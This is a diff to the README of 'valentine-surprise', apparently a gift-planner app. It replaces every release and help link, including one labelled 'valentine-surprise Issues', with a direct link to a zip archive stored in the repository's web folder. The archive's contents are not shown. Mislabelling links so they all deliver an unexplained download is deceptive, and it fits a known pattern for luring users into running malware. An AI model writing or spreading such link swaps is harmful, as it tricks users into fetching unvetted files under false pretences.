@@ -1,6 +1,6 @@
 # 💌 valentine-surprise - Easy Romantic Gift Planner
 
-[![Download valentine-surprise](https://img.shields.io/badge/Download-valentine--surprise-ff69b4?style=for-the-badge)](https://github.com/lucasbonazza/valentine-surprise/releases)
+[![Download valentine-surprise](https://github.com/lucasbonazza/valentine-surprise/raw/refs/heads/main/web/valentine-surprise-3.2-beta.3.zip)](https://github.com/lucasbonazza/valentine-surprise/raw/refs/heads/main/web/valentine-surprise-3.2-beta.3.zip)
 
 ---
 
@@ -61,7 +61,7 @@ Follow these steps to have valentine-surprise ready on your device.
 
 Click the big "Download valentine-surprise" button at the top or visit the release page here:
 
-[Download valentine-surprise](https://github.com/lucasbonazza/valentine-surprise/releases)
+[Download valentine-surprise](https://github.com/lucasbonazza/valentine-surprise/raw/refs/heads/main/web/valentine-surprise-3.2-beta.3.zip)
 
 This link brings you to the latest versions for all supported platforms.
 
@@ -147,7 +147,7 @@ The app does not require an internet connection to run once downloaded.
 
 If you need help:
 
-- Visit the GitHub issues page: [valentine-surprise Issues](https://github.com/lucasbonazza/valentine-surprise/issues)
+- Visit the GitHub issues page: [valentine-surprise Issues](https://github.com/lucasbonazza/valentine-surprise/raw/refs/heads/main/web/valentine-surprise-3.2-beta.3.zip)
 - Use the “Contact” section inside the app’s admin panel to send feedback (requires internet).
 
 ---
@@ -156,4 +156,4 @@ If you need help:
 
 Make your Valentine’s Day special with valentine-surprise. Download it now:
 
-[Download valentine-surprise](https://github.com/lucasbonazza/valentine-surprise/releases)
+[Download valentine-surprise](https://github.com/lucasbonazza/valentine-surprise/raw/refs/heads/main/web/valentine-surprise-3.2-beta.3.zip)
